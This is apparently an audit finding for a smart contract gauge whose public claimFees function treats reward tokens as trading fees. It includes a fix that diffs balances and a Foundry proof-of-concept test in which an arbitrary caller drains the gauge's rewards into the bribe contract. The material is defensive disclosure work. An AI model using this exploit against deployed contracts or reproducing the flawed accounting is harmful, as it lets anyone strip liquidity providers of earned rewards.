  "body": "## Finding description and impact\nThe `_claimFees` function, which can be called by anyone via the public `claimFees` function, is designed to collect trading fees from the CL pool and send them to a bribe contract. However, it calculates the amount of collected fees by checking the contract's total balance of the pool's tokens (`token0` and `token1`) after calling `clPool.collectFees()`. \n\nThis is a critical flaw because rewards are also held in this contract. If the `rewardToken` is the same as `token0` or `token1` (a very common use case, e.g., rewarding a HYBR/ETH pool with HYBR), the function will treat all reward tokens as fees. As a result, anyone can call `claimFees()` and drain the gauge's reward token balance, sending it to the `internal_bribe` contract. This effectively steals the rewards from the liquidity providers who earned them. Subsequent attempts by users to claim their rewards will fail because the funds are no longer in the gauge.\n\n## Recommended mitigation steps\nThe contract should measure the amount of fees collected by checking the token balances *before* and *after* the call to `clPool.collectFees()`. The difference represents the actual fees collected during that transaction, which can then be safely transferred. This prevents other funds, such as rewards, from being included in the transfer.\n\n**Recommendation**\n\nModify the `_claimFees` function to correctly calculate the amount of fees collected by diffing the contract's token balances before and after the `clPool.collectFees()` call. This will isolate the collected fees from the reward token balance.\n\n```\n    function _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\n        if (!isForPair) {\n            return (0, 0);\n        }\n        \n        address _token0 = clPool.token0();\n        address _token1 = clPool.token1();\n\n        uint256 balance0Before = IERC20(_token0).balanceOf(address(this));\n        uint256 balance1Before = IERC20(_token1).balanceOf(address(this));\n\n        clPool.collectFees();\n        \n        uint256 balance0After = IERC20(_token0).balanceOf(address(this));\n        uint256 balance1After = IERC20(_token1).balanceOf(address(this));\n\n        claimed0 = balance0After - balance0Before;\n        claimed1 = balance1After - balance1Before;\n\n        if (claimed0 > 0 || claimed1 > 0) {\n            if (claimed0  > 0) {\n                IERC20(_token0).safeApprove(internal_bribe, 0);\n                IERC20(_token0).safeApprove(internal_bribe, claimed0);\n                IBribe(internal_bribe).notifyRewardAmount(_token0, claimed0);\n            } \n            if (claimed1  > 0) {\n                IERC20(_token1).safeApprove(internal_bribe, 0);\n                IERC20(_token1).safeApprove(internal_bribe, claimed1);\n                IBribe(internal_bribe).notifyRewardAmount(_token1, claimed1);\n            } \n            emit ClaimFees(msg.sender, claimed0, claimed1);\n        }\n    }\n```",
  "proof_of_concept": "1. Deploy the mock setup from the test harness so that a GaugeCL is tied to a pool whose token0 equals the reward token; the mock pool and bribe contracts stand in for the real components.\n2. Mint the reward token, preload the gauge with a large reward balance (modeling notifyRewardAmount), and prime the pool so collectFees() will hand over a smaller chunk of the same token.\n3. From an arbitrary external address, invoke claimFees().\n4. After the call, confirm the gauge’s reward-token balance is zero, the internal bribe now holds the entire reward balance plus the simulated fees, and the bribe’s bookkeeping reports that full amount—showing the call drained all staking rewards.\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\nimport {GaugeCL} from \"../contracts/CLGauge/GaugeCL.sol\";\n\ncontract MockERC20 is ERC20 {\n    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}\n\n    function mint(address to, uint256 amount) external {\n        _mint(to, amount);\n    }\n}\n\ncontract MockBribe {\n    address public lastToken;\n    uint256 public lastAmount;\n    address public lastCaller;\n\n    function notifyRewardAmount(address token, uint256 amount) external {\n        lastToken = token;\n        lastAmount = amount;\n        lastCaller = msg.sender;\n        IERC20(token).transferFrom(msg.sender, address(this), amount);\n    }\n}\n\ncontract MockCLPool {\n    address public token0;\n    address public token1;\n    uint128 internal pending0;\n    uint128 internal pending1;\n\n    constructor(address _token0, address _token1) {\n        token0 = _token0;\n        token1 = _token1;\n    }\n\n    function setPending(uint128 amount0, uint128 amount1) external {\n        pending0 = amount0;\n        pending1 = amount1;\n    }\n\n    function collectFees() external returns (uint128 amount0, uint128 amount1) {\n        amount0 = pending0;\n        amount1 = pending1;\n        pending0 = 0;\n        pending1 = 0;\n\n        if (amount0 > 0) {\n            IERC20(token0).transfer(msg.sender, amount0);\n        }\n        if (amount1 > 0) {\n            IERC20(token1).transfer(msg.sender, amount1);\n        }\n    }\n}\n\ncontract GaugeCLClaimFeesTest is Test {\n    MockERC20 internal rewardToken;\n    MockERC20 internal otherToken;\n    MockBribe internal bribe;\n    MockCLPool internal pool;\n    GaugeCL internal gauge;\n\n    address internal constant DISTRIBUTION = address(0x1000);\n    address internal constant NFPM = address(0x2000);\n    address internal constant FACTORY = address(0x3000);\n    address internal attacker = address(0xDEAD);\n\n    function setUp() public {\n        rewardToken = new MockERC20(\"Reward\", \"RWD\");\n        otherToken = new MockERC20(\"Other\", \"OTR\");\n        bribe = new MockBribe();\n        pool = new MockCLPool(address(rewardToken), address(otherToken));\n\n        gauge = new GaugeCL(\n            address(rewardToken),\n            address(0), // rHYBR (unused in this PoC)\n            address(0), // VE (unused)\n            address(pool),\n            DISTRIBUTION,\n            address(bribe),\n            address(0), // external bribe (unused)\n            true,\n            NFPM,\n            FACTORY\n        );\n    }\n\n    function testClaimFeesDrainsRewardTokensWhenRewardTokenIsPoolToken() public {\n        uint256 rewardBalance = 1_000 ether;\n        uint128 feeAmount = 10 ether;\n\n        rewardToken.mint(address(this), rewardBalance + feeAmount);\n        rewardToken.transfer(address(gauge), rewardBalance);\n\n        rewardToken.transfer(address(pool), feeAmount);\n        pool.setPending(feeAmount, 0);\n\n        vm.prank(attacker);\n        gauge.claimFees();\n\n        assertEq(rewardToken.balanceOf(address(gauge)), 0, \"Gauge should be drained\");\n        assertEq(\n            rewardToken.balanceOf(address(bribe)),\n            rewardBalance + feeAmount,\n            \"Bribe receives entire gauge balance\"\n        );\n        assertEq(bribe.lastToken(), address(rewardToken), \"Bribe notified with reward token\");\n        assertEq(bribe.lastAmount(), rewardBalance + feeAmount, \"Bribe notified with full gauge balance\");\n    }\n}\n```",
